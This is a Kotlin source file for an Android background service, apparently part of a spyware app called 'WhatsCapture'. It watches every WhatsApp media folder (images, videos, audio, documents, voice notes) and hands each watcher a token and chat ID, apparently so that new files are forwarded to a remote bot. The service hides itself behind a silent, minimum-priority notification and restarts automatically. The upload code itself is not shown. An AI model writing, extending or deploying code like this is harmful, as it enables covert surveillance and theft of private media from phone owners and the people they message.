package com.whatscapture

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

class MediaMonitorService : Service() {

    private var watchers = mutableListOf<MediaWatcher>()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        getSharedPreferences("config", MODE_PRIVATE)
            .edit().putBoolean("running", true).apply()

        if (watchers.isEmpty()) {
            startWatching()
        }

        return START_STICKY
    }

    override fun onDestroy() {
        watchers.forEach { it.stopWatching() }
        watchers.clear()
        getSharedPreferences("config", MODE_PRIVATE)
            .edit().putBoolean("running", false).apply()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitor de WhatsApp",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Servicio de monitoreo en segundo plano"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("WhatsCapture activo")
            .setContentText("Monitoreando notificaciones y archivos")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startWatching() {
        val token = Config.getToken(this)
        val chatId = Config.getChatId(this)

        val basePaths = mutableListOf<String>()

        val oldBase = "${Environment.getExternalStorageDirectory()}/WhatsApp/Media"
        basePaths.add(oldBase)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val newBase = "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Media"
            basePaths.add(newBase)
        }

        val subdirs = listOf(
            "WhatsApp Images",
            "WhatsApp Video",
            "WhatsApp Audio",
            "WhatsApp Documents",
            "WhatsApp Stickers",
            "WhatsApp Animated Gifs",
            "WhatsApp Voice Notes"
        )

        for (base in basePaths) {
            for (sub in subdirs) {
                val fullPath = "$base/$sub"
                try {
                    val watcher = MediaWatcher(fullPath, token, chatId)
                    watcher.startWatching()
                    watchers.add(watcher)
                } catch (e: Exception) {
                    Log.e(TAG, "Error en $fullPath", e)
                }
            }
        }

        Log.d(TAG, "Monitoreando ${watchers.size} directorios")
    }

    companion object {
        private const val TAG = "MediaMonitorService"
        private const val CHANNEL_ID = "whatsapp_monitor_channel"
        private const val NOTIFICATION_ID = 1001
    }
}
